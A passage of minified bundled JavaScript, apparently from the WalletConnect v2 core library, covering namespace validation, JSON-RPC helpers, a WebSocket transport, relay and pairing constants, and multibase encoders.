        o || s1(i) || (o = Nr("UNSUPPORTED_CHAINS", `${t}, chain ${i} should be a string and conform to "namespace:chainId" format`))
    }
    ) : s1(r) || (o = Nr("UNSUPPORTED_CHAINS", `${t}, chains must be defined as "namespace:chainId" e.g. "eip155:1": {...} in the namespace key OR as an array of CAIP-2 chainIds e.g. eip155: { chains: ["eip155:1", "eip155:5"] }`)),
    o
}
function Tne(r, e, t) {
    let o = null;
    return Object.entries(r).forEach( ([i,n]) => {
        if (o)
            return;
        const s = vne(i, bN(i, n), `${e} ${t}`);
        s && (o = s)
    }
    ),
    o
}
function Ene(r, e) {
    let t = null;
    return P0(r) ? r.forEach(o => {
        t || yne(o) || (t = Nr("UNSUPPORTED_ACCOUNTS", `${e}, account ${o} should be a string and conform to "namespace:chainId:address" format`))
    }
    ) : t = Nr("UNSUPPORTED_ACCOUNTS", `${e}, accounts should be an array of strings conforming to "namespace:chainId:address" format`),
    t
}
function Ane(r, e) {
    let t = null;
    return Object.values(r).forEach(o => {
        if (t)
            return;
        const i = Ene(o == null ? void 0 : o.accounts, `${e} namespace`);
        i && (t = i)
    }
    ),
    t
}
function Pne(r, e) {
    let t = null;
    return h_(r == null ? void 0 : r.methods) ? h_(r == null ? void 0 : r.events) || (t = Nr("UNSUPPORTED_EVENTS", `${e}, events should be an array of strings or empty array for no events`)) : t = Nr("UNSUPPORTED_METHODS", `${e}, methods should be an array of strings or empty array for no methods`),
    t
}
function rD(r, e) {
    let t = null;
    return Object.values(r).forEach(o => {
        if (t)
            return;
        const i = Pne(o, `${e}, namespace`);
        i && (t = i)
    }
    ),
    t
}
function Cne(r, e, t) {
    let o = null;
    if (r && Zp(r)) {
        const i = rD(r, e);
        i && (o = i);
        const n = Tne(r, e, t);
        n && (o = n)
    } else
        o = Xe("MISSING_OR_INVALID", `${e}, ${t} should be an object with data`);
    return o
}
function w2(r, e) {
    let t = null;
    if (r && Zp(r)) {
        const o = rD(r, e);
        o && (t = o);
        const i = Ane(r, e);
        i && (t = i)
    } else
        t = Xe("MISSING_OR_INVALID", `${e}, namespaces should be an object with data`);
    return t
}
function nD(r) {
    return un(r.protocol, !0)
}
function Sne(r, e) {
    let t = !1;
    return r ? r && P0(r) && r.length && r.forEach(o => {
        t = nD(o)
    }
    ) : t = !0,
    t
}
function Bne(r) {
    return typeof r == "number"
}
function Io(r) {
    return typeof r < "u" && typeof r !== null
}
function _ne(r) {
    return !(!r || typeof r != "object" || !r.code || !W3(r.code, !1) || !r.message || !un(r.message, !1))
}
function Ine(r) {
    return !(zn(r) || !un(r.method, !1))
}
function One(r) {
    return !(zn(r) || zn(r.result) && zn(r.error) || !W3(r.id, !1) || !un(r.jsonrpc, !1))
}
function Rne(r) {
    return !(zn(r) || !un(r.name, !1))
}
function p_(r, e) {
    return !(!s1(e) || !ane(r).includes(e))
}
function Wne(r, e, t) {
    return un(t, !1) ? cne(r, e).includes(t) : !1
}
function Mne(r, e, t) {
    return un(t, !1) ? lne(r, e).includes(t) : !1
}
function g_(r, e, t) {
    let o = null;
    const i = Nne(r)
      , n = Dne(e)
      , s = Object.keys(i)
      , a = Object.keys(n)
      , l = y_(Object.keys(r))
      , f = y_(Object.keys(e))
      , h = l.filter(p => !f.includes(p));
    return h.length && (o = Xe("NON_CONFORMING_NAMESPACES", `${t} namespaces keys don't satisfy requiredNamespaces.
      Required: ${h.toString()}
      Received: ${Object.keys(e).toString()}`)),
    $l(s, a) || (o = Xe("NON_CONFORMING_NAMESPACES", `${t} namespaces chains don't satisfy required namespaces.
      Required: ${s.toString()}
      Approved: ${a.toString()}`)),
    Object.keys(e).forEach(p => {
        if (!p.includes(":") || o)
            return;
        const b = Qd(e[p].accounts);
        b.includes(p) || (o = Xe("NON_CONFORMING_NAMESPACES", `${t} namespaces accounts don't satisfy namespace accounts for ${p}
        Required: ${p}
        Approved: ${b.toString()}`))
    }
    ),
    s.forEach(p => {
        o || ($l(i[p].methods, n[p].methods) ? $l(i[p].events, n[p].events) || (o = Xe("NON_CONFORMING_NAMESPACES", `${t} namespaces events don't satisfy namespace events for ${p}`)) : o = Xe("NON_CONFORMING_NAMESPACES", `${t} namespaces methods don't satisfy namespace methods for ${p}`))
    }
    ),
    o
}
function Nne(r) {
    const e = {};
    return Object.keys(r).forEach(t => {
        var o;
        t.includes(":") ? e[t] = r[t] : (o = r[t].chains) == null || o.forEach(i => {
            e[i] = {
                methods: r[t].methods,
                events: r[t].events
            }
        }
        )
    }
    ),
    e
}
function y_(r) {
    return [...new Set(r.map(e => e.includes(":") ? e.split(":")[0] : e))]
}
function Dne(r) {
    const e = {};
    return Object.keys(r).forEach(t => {
        if (t.includes(":"))
            e[t] = r[t];
        else {
            const o = Qd(r[t].accounts);
            o == null || o.forEach(i => {
                e[i] = {
                    accounts: r[t].accounts.filter(n => n.includes(`${i}:`)),
                    methods: r[t].methods,
                    events: r[t].events
                }
            }
            )
        }
    }
    ),
    e
}
function Fne(r, e) {
    return W3(r, !1) && r <= e.max && r >= e.min
}
function b_() {
    const r = x0();
    return new Promise(e => {
        switch (r) {
        case ci.browser:
            e(Une());
            break;
        case ci.reactNative:
            e(kne());
            break;
        case ci.node:
            e(Lne());
            break;
        default:
            e(!0)
        }
    }
    )
}
function Une() {
    return Yd() && (navigator == null ? void 0 : navigator.onLine)
}
async function kne() {
    if (Qc() && typeof global < "u" && global != null && global.NetInfo) {
        const r = await (global == null ? void 0 : global.NetInfo.fetch());
        return r == null ? void 0 : r.isConnected
    }
    return !0
}
function Lne() {
    return !0
}
function $ne(r) {
    switch (x0()) {
    case ci.browser:
        zne(r);
        break;
    case ci.reactNative:
        jne(r);
        break
    }
}
function zne(r) {
    !Qc() && Yd() && (window.addEventListener("online", () => r(!0)),
    window.addEventListener("offline", () => r(!1)))
}
function jne(r) {
    Qc() && typeof global < "u" && global != null && global.NetInfo && (global == null || global.NetInfo.addEventListener(e => r(e == null ? void 0 : e.isConnected)))
}
function qne() {
    var r;
    return Yd() && Ha.getDocument() ? ((r = Ha.getDocument()) == null ? void 0 : r.visibilityState) === "visible" : !0
}
const v2 = {};
class gp {
    static get(e) {
        return v2[e]
    }
    static set(e, t) {
        v2[e] = t
    }
    static delete(e) {
        delete v2[e]
    }
}
const Vne = "PARSE_ERROR"
  , Hne = "INVALID_REQUEST"
  , Gne = "METHOD_NOT_FOUND"
  , Kne = "INVALID_PARAMS"
  , oD = "INTERNAL_ERROR"
  , M3 = "SERVER_ERROR"
  , Zne = [-32700, -32600, -32601, -32602, -32603]
  , Mp = {
    [Vne]: {
        code: -32700,
        message: "Parse error"
    },
    [Hne]: {
        code: -32600,
        message: "Invalid Request"
    },
    [Gne]: {
        code: -32601,
        message: "Method not found"
    },
    [Kne]: {
        code: -32602,
        message: "Invalid params"
    },
    [oD]: {
        code: -32603,
        message: "Internal error"
    },
    [M3]: {
        code: -32e3,
        message: "Server error"
    }
}
  , iD = M3;
function Yne(r) {
    return Zne.includes(r)
}
function m_(r) {
    return Object.keys(Mp).includes(r) ? Mp[r] : Mp[iD]
}
function Xne(r) {
    const e = Object.values(Mp).find(t => t.code === r);
    return e || Mp[iD]
}
function Jne(r, e, t) {
    return r.message.includes("getaddrinfo ENOTFOUND") || r.message.includes("connect ECONNREFUSED") ? new Error(`Unavailable ${t} RPC url at ${e}`) : r
}
var T2 = {}, wa = {}, x_;
function Qne() {
    if (x_)
        return wa;
    x_ = 1,
    Object.defineProperty(wa, "__esModule", {
        value: !0
    }),
    wa.isBrowserCryptoAvailable = wa.getSubtleCrypto = wa.getBrowerCrypto = void 0;
    function r() {
        return (Ba == null ? void 0 : Ba.crypto) || (Ba == null ? void 0 : Ba.msCrypto) || {}
    }
    wa.getBrowerCrypto = r;
    function e() {
        const o = r();
        return o.subtle || o.webkitSubtle
    }
    wa.getSubtleCrypto = e;
    function t() {
        return !!r() && !!e()
    }
    return wa.isBrowserCryptoAvailable = t,
    wa
}
var va = {}, w_;
function eoe() {
    if (w_)
        return va;
    w_ = 1,
    Object.defineProperty(va, "__esModule", {
        value: !0
    }),
    va.isBrowser = va.isNode = va.isReactNative = void 0;
    function r() {
        return typeof document > "u" && typeof navigator < "u" && navigator.product === "ReactNative"
    }
    va.isReactNative = r;
    function e() {
        return typeof process < "u" && typeof process.versions < "u" && typeof process.versions.node < "u"
    }
    va.isNode = e;
    function t() {
        return !r() && !e()
    }
    return va.isBrowser = t,
    va
}
var v_;
function toe() {
    return v_ || (v_ = 1,
    function(r) {
        Object.defineProperty(r, "__esModule", {
            value: !0
        });
        const e = p0;
        e.__exportStar(Qne(), r),
        e.__exportStar(eoe(), r)
    }(T2)),
    T2
}
var roe = toe();
function Ns(r=3) {
    const e = Date.now() * Math.pow(10, r)
      , t = Math.floor(Math.random() * Math.pow(10, r));
    return e + t
}
function zl(r=6) {
    return BigInt(Ns(r))
}
function jl(r, e, t) {
    return {
        id: t || Ns(),
        jsonrpc: "2.0",
        method: r,
        params: e
    }
}
function N3(r, e) {
    return {
        id: r,
        jsonrpc: "2.0",
        result: e
    }
}
function D3(r, e, t) {
    return {
        id: r,
        jsonrpc: "2.0",
        error: noe(e)
    }
}
function noe(r, e) {
    return typeof r > "u" ? m_(oD) : (typeof r == "string" && (r = Object.assign(Object.assign({}, m_(M3)), {
        message: r
    })),
    Yne(r.code) && (r = Xne(r.code)),
    r)
}
class ooe {
}
let ioe = class extends ooe {
    constructor() {
        super()
    }
}
;
class soe extends ioe {
    constructor(e) {
        super()
    }
}
const aoe = "^wss?:";
function coe(r) {
    const e = r.match(new RegExp(/^\w+:/,"gi"));
    if (!(!e || !e.length))
        return e[0]
}
function loe(r, e) {
    const t = coe(r);
    return typeof t > "u" ? !1 : new RegExp(e).test(t)
}
function T_(r) {
    return loe(r, aoe)
}
function uoe(r) {
    return new RegExp("wss?://localhost(:d{2,5})?").test(r)
}
function sD(r) {
    return typeof r == "object" && "id"in r && "jsonrpc"in r && r.jsonrpc === "2.0"
}
function F3(r) {
    return sD(r) && "method"in r
}
function U1(r) {
    return sD(r) && (Ds(r) || Ni(r))
}
function Ds(r) {
    return "result"in r
}
function Ni(r) {
    return "error"in r
}
class foe extends soe {
    constructor(e) {
        super(e),
        this.events = new fs.EventEmitter,
        this.hasRegisteredEventListeners = !1,
        this.connection = this.setConnection(e),
        this.connection.connected && this.registerEventListeners()
    }
    async connect(e=this.connection) {
        await this.open(e)
    }
    async disconnect() {
        await this.close()
    }
    on(e, t) {
        this.events.on(e, t)
    }
    once(e, t) {
        this.events.once(e, t)
    }
    off(e, t) {
        this.events.off(e, t)
    }
    removeListener(e, t) {
        this.events.removeListener(e, t)
    }
    async request(e, t) {
        return this.requestStrict(jl(e.method, e.params || [], e.id || zl().toString()), t)
    }
    async requestStrict(e, t) {
        return new Promise(async (o, i) => {
            if (!this.connection.connected)
                try {
                    await this.open()
                } catch (n) {
                    i(n)
                }
            this.events.on(`${e.id}`, n => {
                Ni(n) ? i(n.error) : o(n.result)
            }
            );
            try {
                await this.connection.send(e, t)
            } catch (n) {
                i(n)
            }
        }
        )
    }
    setConnection(e=this.connection) {
        return e
    }
    onPayload(e) {
        this.events.emit("payload", e),
        U1(e) ? this.events.emit(`${e.id}`, e) : this.events.emit("message", {
            type: e.method,
            data: e.params
        })
    }
    onClose(e) {
        e && e.code === 3e3 && this.events.emit("error", new Error(`WebSocket connection closed abnormally with code: ${e.code} ${e.reason ? `(${e.reason})` : ""}`)),
        this.events.emit("disconnect")
    }
    async open(e=this.connection) {
        this.connection === e && this.connection.connected || (this.connection.connected && this.close(),
        typeof e == "string" && (await this.connection.open(e),
        e = this.connection),
        this.connection = this.setConnection(e),
        await this.connection.open(),
        this.registerEventListeners(),
        this.events.emit("connect"))
    }
    async close() {
        await this.connection.close()
    }
    registerEventListeners() {
        this.hasRegisteredEventListeners || (this.connection.on("payload", e => this.onPayload(e)),
        this.connection.on("close", e => this.onClose(e)),
        this.connection.on("error", e => this.events.emit("error", e)),
        this.connection.on("register_error", e => this.onClose()),
        this.hasRegisteredEventListeners = !0)
    }
}
const doe = () => typeof WebSocket < "u" ? WebSocket : typeof global < "u" && typeof global.WebSocket < "u" ? global.WebSocket : typeof window < "u" && typeof window.WebSocket < "u" ? window.WebSocket : typeof self < "u" && typeof self.WebSocket < "u" ? self.WebSocket : require("ws")
  , hoe = () => typeof WebSocket < "u" || typeof global < "u" && typeof global.WebSocket < "u" || typeof window < "u" && typeof window.WebSocket < "u" || typeof self < "u" && typeof self.WebSocket < "u"
  , E_ = r => r.split("?")[0]
  , A_ = 10
  , poe = doe();
let goe = class {
    constructor(e) {
        if (this.url = e,
        this.events = new fs.EventEmitter,
        this.registering = !1,
        !T_(e))
            throw new Error(`Provided URL is not compatible with WebSocket connection: ${e}`);
        this.url = e
    }
    get connected() {
        return typeof this.socket < "u"
    }
    get connecting() {
        return this.registering
    }
    on(e, t) {
        this.events.on(e, t)
    }
    once(e, t) {
        this.events.once(e, t)
    }
    off(e, t) {
        this.events.off(e, t)
    }
    removeListener(e, t) {
        this.events.removeListener(e, t)
    }
    async open(e=this.url) {
        await this.register(e)
    }
    async close() {
        return new Promise( (e, t) => {
            if (typeof this.socket > "u") {
                t(new Error("Connection already closed"));
                return
            }
            this.socket.onclose = o => {
                this.onClose(o),
                e()
            }
            ,
            this.socket.close()
        }
        )
    }
    async send(e) {
        typeof this.socket > "u" && (this.socket = await this.register());
        try {
            this.socket.send(uu(e))
        } catch (t) {
            this.onError(e.id, t)
        }
    }
    register(e=this.url) {
        if (!T_(e))
            throw new Error(`Provided URL is not compatible with WebSocket connection: ${e}`);
        if (this.registering) {
            const t = this.events.getMaxListeners();
            return (this.events.listenerCount("register_error") >= t || this.events.listenerCount("open") >= t) && this.events.setMaxListeners(t + 1),
            new Promise( (o, i) => {
                this.events.once("register_error", n => {
                    this.resetMaxListeners(),
                    i(n)
                }
                ),
                this.events.once("open", () => {
                    if (this.resetMaxListeners(),
                    typeof this.socket > "u")
                        return i(new Error("WebSocket connection is missing or invalid"));
                    o(this.socket)
                }
                )
            }
            )
        }
        return this.url = e,
        this.registering = !0,
        new Promise( (t, o) => {
            const i = roe.isReactNative() ? void 0 : {
                rejectUnauthorized: !uoe(e)
            }
              , n = new poe(e,[],i);
            hoe() ? n.onerror = s => {
                const a = s;
                o(this.emitError(a.error))
            }
            : n.on("error", s => {
                o(this.emitError(s))
            }
            ),
            n.onopen = () => {
                this.onOpen(n),
                t(n)
            }
        }
        )
    }
    onOpen(e) {
        e.onmessage = t => this.onPayload(t),
        e.onclose = t => this.onClose(t),
        this.socket = e,
        this.registering = !1,
        this.events.emit("open")
    }
    onClose(e) {
        this.socket = void 0,
        this.registering = !1,
        this.events.emit("close", e)
    }
    onPayload(e) {
        if (typeof e.data > "u")
            return;
        const t = typeof e.data == "string" ? Ed(e.data) : e.data;
        this.events.emit("payload", t)
    }
    onError(e, t) {
        const o = this.parseError(t)
          , i = o.message || o.toString()
          , n = D3(e, i);
        this.events.emit("payload", n)
    }
    parseError(e, t=this.url) {
        return Jne(e, E_(t), "WS")
    }
    resetMaxListeners() {
        this.events.getMaxListeners() > A_ && this.events.setMaxListeners(A_)
    }
    emitError(e) {
        const t = this.parseError(new Error((e == null ? void 0 : e.message) || `WebSocket connection failed for host: ${E_(this.url)}`));
        return this.events.emit("register_error", t),
        t
    }
}
;
var yoe = {};
const aD = "wc"
  , cD = 2
  , YE = "core"
  , Zs = `${aD}@2:${YE}:`
  , boe = {
    logger: "error"
}
  , moe = {
    database: ":memory:"
}
  , xoe = "crypto"
  , P_ = "client_ed25519_seed"
  , woe = Ze.ONE_DAY
  , voe = "keychain"
  , Toe = "0.3"
  , Eoe = "messages"
  , Aoe = "0.3"
  , C_ = Ze.SIX_HOURS
  , Poe = "publisher"
  , lD = "irn"
  , Coe = "error"
  , uD = "wss://relay.walletconnect.org"
  , Soe = "relayer"
  , Bn = {
    message: "relayer_message",
    message_ack: "relayer_message_ack",
    connect: "relayer_connect",
    disconnect: "relayer_disconnect",
    error: "relayer_error",
    connection_stalled: "relayer_connection_stalled",
    transport_closed: "relayer_transport_closed",
    publish: "relayer_publish"
}
  , Boe = "_subscription"
  , vi = {
    payload: "payload",
    connect: "connect",
    disconnect: "disconnect",
    error: "error"
}
  , _oe = .1
  , XE = "2.21.0"
  , kr = {
    link_mode: "link_mode",
    relay: "relay"
}
  , Am = {
    inbound: "inbound",
    outbound: "outbound"
}
  , Ioe = "0.3"
  , Ooe = "WALLETCONNECT_CLIENT_ID"
  , S_ = "WALLETCONNECT_LINK_MODE_APPS"
  , ti = {
    created: "subscription_created",
    deleted: "subscription_deleted",
    expired: "subscription_expired",
    disabled: "subscription_disabled",
    sync: "subscription_sync",
    resubscribed: "subscription_resubscribed"
}
  , Roe = "subscription"
  , Woe = "0.3"
  , Moe = "pairing"
  , Noe = "0.3"
  , yp = {
    wc_pairingDelete: {
        req: {
            ttl: Ze.ONE_DAY,
            prompt: !1,
            tag: 1e3
        },
        res: {
            ttl: Ze.ONE_DAY,
            prompt: !1,
            tag: 1001
        }
    },
    wc_pairingPing: {
        req: {
            ttl: Ze.THIRTY_SECONDS,
            prompt: !1,
            tag: 1002
        },
        res: {
            ttl: Ze.THIRTY_SECONDS,
            prompt: !1,
            tag: 1003
        }
    },
    unregistered_method: {
        req: {
            ttl: Ze.ONE_DAY,
            prompt: !1,
            tag: 0
        },
        res: {
            ttl: Ze.ONE_DAY,
            prompt: !1,
            tag: 0
        }
    }
}
  , Nl = {
    create: "pairing_create",
    expire: "pairing_expire",
    delete: "pairing_delete",
    ping: "pairing_ping"
}
  , Ki = {
    created: "history_created",
    updated: "history_updated",
    deleted: "history_deleted",
    sync: "history_sync"
}
  , Doe = "history"
  , Foe = "0.3"
  , Uoe = "expirer"
  , Oi = {
    created: "expirer_created",
    deleted: "expirer_deleted",
    expired: "expirer_expired",
    sync: "expirer_sync"
}
  , koe = "0.3"
  , Loe = "verify-api"
  , $oe = "https://verify.walletconnect.com"
  , fD = "https://verify.walletconnect.org"
  , Np = fD
  , zoe = `${Np}/v3`
  , joe = [$oe, fD]
  , qoe = "echo"
  , Voe = "https://echo.walletconnect.com"
  , Ws = {
    pairing_started: "pairing_started",
    pairing_uri_validation_success: "pairing_uri_validation_success",
    pairing_uri_not_expired: "pairing_uri_not_expired",
    store_new_pairing: "store_new_pairing",
    subscribing_pairing_topic: "subscribing_pairing_topic",
    subscribe_pairing_topic_success: "subscribe_pairing_topic_success",
    existing_pairing: "existing_pairing",
    pairing_not_expired: "pairing_not_expired",
    emit_inactive_pairing: "emit_inactive_pairing",
    emit_session_proposal: "emit_session_proposal",
    subscribing_to_pairing_topic: "subscribing_to_pairing_topic"
}
  , Aa = {
    no_wss_connection: "no_wss_connection",
    no_internet_connection: "no_internet_connection",
    malformed_pairing_uri: "malformed_pairing_uri",
    active_pairing_already_exists: "active_pairing_already_exists",
    subscribe_pairing_topic_failure: "subscribe_pairing_topic_failure",
    pairing_expired: "pairing_expired",
    proposal_expired: "proposal_expired",
    proposal_listener_not_found: "proposal_listener_not_found"
}
  , Zi = {
    session_approve_started: "session_approve_started",
    proposal_not_expired: "proposal_not_expired",
    session_namespaces_validation_success: "session_namespaces_validation_success",
    create_session_topic: "create_session_topic",
    subscribing_session_topic: "subscribing_session_topic",
    subscribe_session_topic_success: "subscribe_session_topic_success",
    publishing_session_approve: "publishing_session_approve",
    session_approve_publish_success: "session_approve_publish_success",
    store_session: "store_session",
    publishing_session_settle: "publishing_session_settle",
    session_settle_publish_success: "session_settle_publish_success"
}
  , Pl = {
    no_internet_connection: "no_internet_connection",
    no_wss_connection: "no_wss_connection",
    proposal_expired: "proposal_expired",
    subscribe_session_topic_failure: "subscribe_session_topic_failure",
    session_approve_publish_failure: "session_approve_publish_failure",
    session_settle_publish_failure: "session_settle_publish_failure",
    session_approve_namespace_validation_failure: "session_approve_namespace_validation_failure",
    proposal_not_found: "proposal_not_found"
}
  , Cl = {
    authenticated_session_approve_started: "authenticated_session_approve_started",
    create_authenticated_session_topic: "create_authenticated_session_topic",
    cacaos_verified: "cacaos_verified",
    store_authenticated_session: "store_authenticated_session",
    subscribing_authenticated_session_topic: "subscribing_authenticated_session_topic",
    subscribe_authenticated_session_topic_success: "subscribe_authenticated_session_topic_success",
    publishing_authenticated_session_approve: "publishing_authenticated_session_approve"
}
  , bp = {
    no_internet_connection: "no_internet_connection",
    invalid_cacao: "invalid_cacao",
    subscribe_authenticated_session_topic_failure: "subscribe_authenticated_session_topic_failure",
    authenticated_session_approve_publish_failure: "authenticated_session_approve_publish_failure",
    authenticated_session_pending_request_not_found: "authenticated_session_pending_request_not_found"
}
  , Hoe = .1
  , Goe = "event-client"
  , Koe = 86400
  , Zoe = "https://pulse.walletconnect.org/batch";
function Yoe(r, e) {
    if (r.length >= 255)
        throw new TypeError("Alphabet too long");
    for (var t = new Uint8Array(256), o = 0; o < t.length; o++)
        t[o] = 255;
    for (var i = 0; i < r.length; i++) {
        var n = r.charAt(i)
          , s = n.charCodeAt(0);
        if (t[s] !== 255)
            throw new TypeError(n + " is ambiguous");
        t[s] = i
    }
    var a = r.length
      , l = r.charAt(0)
      , f = Math.log(a) / Math.log(256)
      , h = Math.log(256) / Math.log(a);
    function p(T) {
        if (T instanceof Uint8Array || (ArrayBuffer.isView(T) ? T = new Uint8Array(T.buffer,T.byteOffset,T.byteLength) : Array.isArray(T) && (T = Uint8Array.from(T))),
        !(T instanceof Uint8Array))
            throw new TypeError("Expected Uint8Array");
        if (T.length === 0)
            return "";
        for (var x = 0, E = 0, B = 0, P = T.length; B !== P && T[B] === 0; )
            B++,
            x++;
        for (var O = (P - B) * h + 1 >>> 0, F = new Uint8Array(O); B !== P; ) {
            for (var D = T[B], I = 0, M = O - 1; (D !== 0 || I < E) && M !== -1; M--,
            I++)
                D += 256 * F[M] >>> 0,
                F[M] = D % a >>> 0,
                D = D / a >>> 0;
            if (D !== 0)
                throw new Error("Non-zero carry");
            E = I,
            B++
        }
        for (var C = O - E; C !== O && F[C] === 0; )
            C++;
        for (var W = l.repeat(x); C < O; ++C)
            W += r.charAt(F[C]);
        return W
    }
    function b(T) {
        if (typeof T != "string")
            throw new TypeError("Expected String");
        if (T.length === 0)
            return new Uint8Array;
        var x = 0;
        if (T[x] !== " ") {
            for (var E = 0, B = 0; T[x] === l; )
                E++,
                x++;
            for (var P = (T.length - x) * f + 1 >>> 0, O = new Uint8Array(P); T[x]; ) {
                var F = t[T.charCodeAt(x)];
                if (F === 255)
                    return;
                for (var D = 0, I = P - 1; (F !== 0 || D < B) && I !== -1; I--,
                D++)
                    F += a * O[I] >>> 0,
                    O[I] = F % 256 >>> 0,
                    F = F / 256 >>> 0;
                if (F !== 0)
                    throw new Error("Non-zero carry");
                B = D,
                x++
            }
            if (T[x] !== " ") {
                for (var M = P - B; M !== P && O[M] === 0; )
                    M++;
                for (var C = new Uint8Array(E + (P - M)), W = E; M !== P; )
                    C[W++] = O[M++];
                return C
            }
        }
    }
    function v(T) {
        var x = b(T);
        if (x)
            return x;
        throw new Error(`Non-${e} character`)
    }
    return {
        encode: p,
        decodeUnsafe: b,
        decode: v
    }
}
var Xoe = Yoe
  , Joe = Xoe;
const dD = r => {
    if (r instanceof Uint8Array && r.constructor.name === "Uint8Array")
        return r;
    if (r instanceof ArrayBuffer)
        return new Uint8Array(r);
    if (ArrayBuffer.isView(r))
        return new Uint8Array(r.buffer,r.byteOffset,r.byteLength);
    throw new Error("Unknown type, must be binary type")
}
  , Qoe = r => new TextEncoder().encode(r)
  , eie = r => new TextDecoder().decode(r);
class tie {
    constructor(e, t, o) {
        this.name = e,
        this.prefix = t,
        this.baseEncode = o
    }
    encode(e) {
        if (e instanceof Uint8Array)
            return `${this.prefix}${this.baseEncode(e)}`;
        throw Error("Unknown type, must be binary type")
    }
}
class rie {
    constructor(e, t, o) {
        if (this.name = e,
        this.prefix = t,
        t.codePointAt(0) === void 0)
            throw new Error("Invalid prefix character");
        this.prefixCodePoint = t.codePointAt(0),
        this.baseDecode = o
    }
    decode(e) {
        if (typeof e == "string") {
            if (e.codePointAt(0) !== this.prefixCodePoint)
                throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);
            return this.baseDecode(e.slice(this.prefix.length))
        } else
            throw Error("Can only multibase decode strings")
    }
    or(e) {
        return hD(this, e)
    }
}
class nie {
    constructor(e) {
        this.decoders = e
    }
    or(e) {
        return hD(this, e)
    }
    decode(e) {
        const t = e[0]
          , o = this.decoders[t];
        if (o)
            return o.decode(e);
        throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)
    }
}
const hD = (r, e) => new nie({
    ...r.decoders || {
        [r.prefix]: r
    },
    ...e.decoders || {
        [e.prefix]: e
    }
});
class oie {
    constructor(e, t, o, i) {
        this.name = e,
        this.prefix = t,
        this.baseEncode = o,
        this.baseDecode = i,
        this.encoder = new tie(e,t,o),
        this.decoder = new rie(e,t,i)
    }
    encode(e) {
        return this.encoder.encode(e)
    }
    decode(e) {
        return this.decoder.decode(e)
    }
}
const k1 = ({name: r, prefix: e, encode: t, decode: o}) => new oie(r,e,t,o)
  , C0 = ({prefix: r, name: e, alphabet: t}) => {
    const {encode: o, decode: i} = Joe(t, e);
    return k1({
        prefix: r,
        name: e,
        encode: o,
        decode: n => dD(i(n))
    })
}
  , iie = (r, e, t, o) => {
    const i = {};
    for (let h = 0; h < e.length; ++h)
        i[e[h]] = h;
    let n = r.length;
    for (; r[n - 1] === "="; )
        --n;
    const s = new Uint8Array(n * t / 8 | 0);
    let a = 0
      , l = 0
      , f = 0;
    for (let h = 0; h < n; ++h) {
        const p = i[r[h]];
        if (p === void 0)
            throw new SyntaxError(`Non-${o} character`);
        l = l << t | p,
        a += t,
        a >= 8 && (a -= 8,
        s[f++] = 255 & l >> a)
    }
    if (a >= t || 255 & l << 8 - a)
        throw new SyntaxError("Unexpected end of data");
    return s
}
  , sie = (r, e, t) => {
    const o = e[e.length - 1] === "="
      , i = (1 << t) - 1;
    let n = ""
      , s = 0
      , a = 0;
    for (let l = 0; l < r.length; ++l)
        for (a = a << 8 | r[l],
        s += 8; s > t; )
            s -= t,
            n += e[i & a >> s];
    if (s && (n += e[i & a << t - s]),
    o)
        for (; n.length * t & 7; )
            n += "=";
    return n
}
  , Hn = ({name: r, prefix: e, bitsPerChar: t, alphabet: o}) => k1({
    prefix: e,
    name: r,
    encode(i) {
        return sie(i, o, t)
    },
    decode(i) {
        return iie(i, o, t, r)
    }
})
  , aie = k1({
    prefix: "\0",
    name: "identity",
    encode: r => eie(r),
    decode: r => Qoe(r)
});
var cie = Object.freeze({
    __proto__: null,
    identity: aie
});
const lie = Hn({
    prefix: "0",
    name: "base2",
    alphabet: "01",
    bitsPerChar: 1
});
var uie = Object.freeze({
    __proto__: null,
    base2: lie
});
const fie = Hn({
    prefix: "7",
    name: "base8",
    alphabet: "01234567",
    bitsPerChar: 3
});
var die = Object.freeze({
    __proto__: null,
    base8: fie
});
const hie = C0({
    prefix: "9",
    name: "base10",
    alphabet: "0123456789"
});
var pie = Object.freeze({
    __proto__: null,
    base10: hie
});
const gie = Hn({
    prefix: "f",
    name: "base16",
    alphabet: "0123456789abcdef",
    bitsPerChar: 4
})
  , yie = Hn({
    prefix: "F",
    name: "base16upper",
    alphabet: "0123456789ABCDEF",
    bitsPerChar: 4
});
var bie = Object.freeze({
    __proto__: null,
    base16: gie,
    base16upper: yie
});
const mie = Hn({
    prefix: "b",
    name: "base32",
    alphabet: "abcdefghijklmnopqrstuvwxyz234567",
    bitsPerChar: 5
})
  , xie = Hn({
    prefix: "B",
    name: "base32upper",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",
    bitsPerChar: 5
})
  , wie = Hn({
    prefix: "c",
    name: "base32pad",
    alphabet: "abcdefghijklmnopqrstuvwxyz234567=",
    bitsPerChar: 5
})
  , vie = Hn({
    prefix: "C",
    name: "base32padupper",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",
    bitsPerChar: 5
})
  , Tie = Hn({
    prefix: "v",
    name: "base32hex",
    alphabet: "0123456789abcdefghijklmnopqrstuv",
    bitsPerChar: 5
})
  , Eie = Hn({
    prefix: "V",
    name: "base32hexupper",
    alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUV",
    bitsPerChar: 5
})
  , Aie = Hn({
    prefix: "t",
    name: "base32hexpad",
    alphabet: "0123456789abcdefghijklmnopqrstuv=",
    bitsPerChar: 5
})
  , Pie = Hn({
    prefix: "T",
    name: "base32hexpadupper",
    alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUV=",
    bitsPerChar: 5
})
  , Cie = Hn({
    prefix: "h",
    name: "base32z",
    alphabet: "ybndrfg8ejkmcpqxot1uwisza345h769",
    bitsPerChar: 5
});
var Sie = Object.freeze({
    __proto__: null,
    base32: mie,
    base32upper: xie,
    base32pad: wie,
    base32padupper: vie,
    base32hex: Tie,
    base32hexupper: Eie,
    base32hexpad: Aie,
    base32hexpadupper: Pie,
    base32z: Cie
});
const Bie = C0({
    prefix: "k",
    name: "base36",
    alphabet: "0123456789abcdefghijklmnopqrstuvwxyz"
})
  , _ie = C0({
    prefix: "K",
    name: "base36upper",
    alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
});
var Iie = Object.freeze({
    __proto__: null,
    base36: Bie,
    base36upper: _ie
});
const Oie = C0({
    name: "base58btc",
    prefix: "z",
    alphabet: "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
})
  , Rie = C0({
